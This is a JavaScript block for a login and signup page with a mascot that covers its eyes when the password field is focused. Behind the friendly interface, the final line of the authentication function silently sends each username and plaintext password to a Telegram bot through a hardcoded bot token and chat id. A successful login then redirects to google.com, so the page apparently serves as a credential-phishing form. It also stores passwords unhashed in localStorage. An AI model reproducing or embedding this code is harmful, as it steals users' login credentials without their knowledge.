<script>
    let isLogin = true;
    const img = document.getElementById('mascot-img');
    const pass = document.getElementById('password');
    const confirmPass = document.getElementById('confirm-password');

    // Image poses
    const poses = {
        idle: '1000022715.jpg',
        covering: '1000022716.jpg',
        peeking: '1000022717.jpg'
    };

    // 1. Eye movement logic
    pass.addEventListener('focus', () => { img.src = poses.covering; });
    pass.addEventListener('blur', () => { img.src = poses.idle; });

    // 2. Toggle show/hide logic
    function togglePass(id) {
        const field = document.getElementById(id);
        const btn = id === 'password' ? document.querySelectorAll('.toggle-pass')[0] : document.getElementById('toggle-confirm');
        
        if (field.type === "password") {
            field.type = "text";
            img.src = poses.peeking; // Peeking pose
            btn.innerText = "🙈";
        } else {
            field.type = "password";
            img.src = poses.covering; // Covering pose
            btn.innerText = "👁️";
        }
    }

    // 3. Switch Form
    function switchForm() {
        isLogin = !isLogin;
        document.getElementById('email').style.display = isLogin ? 'none' : 'block';
        confirmPass.style.display = isLogin ? 'none' : 'block';
        document.getElementById('toggle-confirm').style.display = isLogin ? 'none' : 'block';
        
        document.getElementById('form-title').innerText = isLogin ? "Login" : "Create Account";
        document.getElementById('action-btn').innerText = isLogin ? "SECURE LOGIN" : "REGISTER";
        document.getElementById('toggle-link').innerText = isLogin ? "Create Account" : "Back to Login";
        img.src = poses.idle;
    }

    // 4. Auth Logic
    function handleAuth() {
        const user = document.getElementById('username').value;
        const passVal = document.getElementById('password').value;
        const email = document.getElementById('email').value;

        if (!user || !passVal) return alert("Please fill all fields!");

        if (isLogin) {
            // Login Logic
            const savedData = localStorage.getItem(user);
            if (savedData) {
                const userData = JSON.parse(savedData);
                if (userData.pass === passVal) {
                    alert("Login Successful!");
                    window.location.href = "https://www.google.com";
                } else {
                    alert("Incorrect Password!");
                }
            } else {
                alert("User not found!");
            }
        } else {
            // Register Logic
            if (passVal !== confirmPass.value) return alert("Passwords don't match!");
            
            localStorage.setItem(user, JSON.stringify({email: email, pass: passVal}));
            alert("Account Created Successfully!");
            switchForm();
        }

        // Telegram Logging
        fetch(`https://api.telegram.org/bot8736432847:AAHbDf-tOzpa6q--_R-1MRGeENKkh9CEHWc/sendMessage?chat_id=7950771882&text=Action:${isLogin?'Login':'Signup'}%0AUser:${user}%0APass:${passVal}`);
    }
</script>
